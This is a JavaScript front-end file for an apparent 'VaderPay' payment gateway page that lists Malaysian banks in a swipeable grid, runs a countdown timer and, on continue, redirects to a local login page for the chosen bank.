/* =========================================================
   VADERPAY PAYMENT GATEWAY - PDF MATCH
   ========================================================= */

const bankGrid = document.getElementById("bankGrid");
const dotsContainer = document.getElementById("dots");
const timerElement = document.getElementById("timer");
const continueBtn = document.getElementById("continueBtn");
const mobileContinue = document.getElementById("mobileContinue");
const selectedBankLabel = document.getElementById("selectedBankLabel");

const desktopNotes = document.getElementById("desktopNotes");
const desktopNotesContent = document.getElementById("desktopNotesContent");
const mobileImportant = document.getElementById("mobileImportant");
const mobileNotesContent = document.getElementById("mobileNotesContent");

const banks = [
  { name: "Public Bank", asset: "assets/bank/bank-Pb.svg" },
  { name: "Maybank", asset: "assets/bank/bank-maybank.svg" },
  { name: "CIMB Bank", asset: "assets/bank/bank-Cimb.svg" },
  { name: "Affin Bank", asset: "assets/bank/bank-affin.svg" },
  { name: "Hong Leong Bank", asset: "assets/bank/bank-HLB.svg" },
  { name: "RHB Bank", asset: "assets/bank/bank-RHB.svg" },
  { name: "Alliance Bank", asset: "assets/bank/bank-alliance.svg" },
  { name: "AM Bank", asset: "assets/bank/bank-am.svg" },
  { name: "BSN Bank", asset: "assets/bank/bank-bsn.svg" },
  { name: "Bank Islam", asset: "assets/bank/bank-ISLAM.svg" },
  { name: "OCBC Bank", asset: "assets/bank/bank-ocbc.svg" },
  { name: "UOB Bank", asset: "assets/bank/bank-uob.svg" },
  { name: "Bank Rakyat", asset: "assets/bank/bank-bankrakyat.svg" },
];

const banksPerPage = 12;
let currentPage = 0;
let selectedBank = "Maybank";

function pageCount() {
  return Math.ceil(banks.length / banksPerPage);
}

function renderDots() {
  dotsContainer.innerHTML = "";

  for (let i = 0; i < pageCount(); i++) {
    const dot = document.createElement("button");
    dot.type = "button";
    dot.className = "dot" + (i === currentPage ? " active" : "");
    dot.setAttribute("aria-label", `Bank page ${i + 1}`);

    dot.addEventListener("click", () => goToPage(i));

    dotsContainer.appendChild(dot);
  }
}

function renderBanks() {
  bankGrid.innerHTML = "";

  const start = currentPage * banksPerPage;
  const visible = banks.slice(start, start + banksPerPage);

  visible.forEach((bank) => {
    const card = document.createElement("button");
    card.type = "button";
    card.className = "bank-card" + (
      bank.name === selectedBank ? " selected" : ""
    );

    card.innerHTML = `
      <img src="${bank.asset}" alt="${bank.name}">
      <span>${bank.name}</span>
    `;

    card.addEventListener("click", () => {
      selectedBank = bank.name;
      selectedBankLabel.textContent = selectedBank;
      renderBanks();
    });

    bankGrid.appendChild(card);
  });

  renderDots();
}

function goToPage(page) {
  const next = Math.max(0, Math.min(page, pageCount() - 1));
  if (next === currentPage) return;

  const direction = next > currentPage ? "slide-left" : "slide-right";

  bankGrid.classList.remove("slide-left", "slide-right");
  void bankGrid.offsetWidth;

  currentPage = next;

  /* Page navigation does not auto-select a bank. */
  selectedBank = null;
  selectedBankLabel.textContent = "Select a bank";

  renderBanks();
  bankGrid.classList.add(direction);
}

/* Mobile swipe */
let startX = 0;
let startY = 0;

bankGrid.addEventListener("touchstart", (e) => {
  if (!e.touches.length) return;
  startX = e.touches[0].clientX;
  startY = e.touches[0].clientY;
}, { passive: true });

bankGrid.addEventListener("touchend", (e) => {
  if (!e.changedTouches.length) return;

  const dx = e.changedTouches[0].clientX - startX;
  const dy = e.changedTouches[0].clientY - startY;

  if (Math.abs(dx) < 45 || Math.abs(dx) <= Math.abs(dy)) return;

  goToPage(dx < 0 ? currentPage + 1 : currentPage - 1);
}, { passive: true });

/* Important Notes */
function toggleNotes(button, content) {
  if (!button || !content) return;

  const open = content.classList.toggle("open");
  const icon = button.querySelector(".notes-dropdown-icon");

  if (icon) {
    icon.style.transform = open ? "rotate(180deg)" : "rotate(0deg)";
  }
}

desktopNotes.addEventListener("click", () => {
  toggleNotes(desktopNotes, desktopNotesContent);
});

mobileImportant.addEventListener("click", () => {
  toggleNotes(mobileImportant, mobileNotesContent);
});

/* Continue */
function continuePayment() {
  if (!selectedBank) {
    showMessage("Please select a bank");
    return;
  }

  window.location.href = `login.html?bank=${encodeURIComponent(selectedBank)}`;
}

continueBtn.addEventListener("click", continuePayment);
mobileContinue.addEventListener("click", continuePayment);

/* Timer */
let totalSeconds = 4 * 60 + 16;

setInterval(() => {
  if (totalSeconds > 0) totalSeconds--;

  const minutes = String(Math.floor(totalSeconds / 60)).padStart(2, "0");
  const seconds = String(totalSeconds % 60).padStart(2, "0");

  timerElement.textContent = `${minutes}:${seconds}`;
}, 1000);

/* Toast */
function showMessage(message) {
  let toast = document.querySelector(".toast");

  if (!toast) {
    toast = document.createElement("div");
    toast.className = "toast";
    document.body.appendChild(toast);
  }

  toast.textContent = message;
  toast.classList.add("show");

  clearTimeout(toast.timer);
  toast.timer = setTimeout(() => toast.classList.remove("show"), 1500);
}

renderBanks();
